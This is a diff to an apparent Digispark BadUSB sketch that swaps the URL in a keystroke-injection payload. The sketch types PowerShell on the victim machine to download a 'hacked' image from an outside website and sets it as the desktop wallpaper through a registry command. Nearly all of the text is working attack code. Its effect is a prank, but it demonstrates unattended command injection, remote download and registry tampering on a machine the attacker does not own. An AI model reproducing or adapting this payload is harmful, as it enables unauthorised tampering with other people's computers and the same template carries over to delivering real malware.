@@ -21,7 +21,7 @@ void loop() {
   DigiKeyboard.print("$client = new-object System.Net.WebClient");
   DigiKeyboard.sendKeyStroke(KEY_ENTER);
   DigiKeyboard.delay(750);
-  DigiKeyboard.print("$client.DownloadFile(\"https://outlet119.com/wp-content/uploads/2020/02/Youve-Been-Hacked-2048x1152.jpg\" , \"hacked.jpg\")"); // Random hacked image downloaded.
+  DigiKeyboard.print("$client.DownloadFile(\"https://mailprotector.com/wp-content/uploads/2021/11/website-hacked-mailprotector-wordpress-scaled.jpg\" , \"hacked.jpg\")"); // Random hacked image downloaded.
   DigiKeyboard.sendKeyStroke(KEY_ENTER);
   DigiKeyboard.delay(750);
   DigiKeyboard.print("reg add \"HKCU\\Control Panel\\Desktop\" /v WallPaper /d \"%USERPROFILE%\\hacked.jpg\" /f");
